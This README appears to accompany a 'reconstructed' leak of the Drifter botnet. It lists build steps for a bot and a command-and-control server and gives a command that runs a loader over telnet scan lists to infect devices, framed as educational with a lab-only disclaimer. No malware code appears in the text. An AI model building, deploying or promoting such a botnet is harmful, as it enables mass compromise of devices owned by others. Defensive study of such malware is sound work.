# cc — Drifter leak (educational reconstruction)

Source material and write-up: [Deepfield Drifter report](https://github.com/deepfield/public-research/blob/main/drifter/report.md) (Guardian researcher leak; for education and defensive study).

## Build

| Component | Path | Build |
|-----------|------|-------|
| Bot | `reconstructed_drifter/` | `make` (Makefile included) |
| CNC | `raw-server/` | `make` (Makefile included) |

## Loader / infection test (lab only)

```bash
cd loader
# Example telnet list: telnets.txt
./ScanListen
```

`ScanListen` reads `*.txt` telnet result files automatically.

## Disclaimer

Do not deploy against systems you do not own or lack written permission to test.
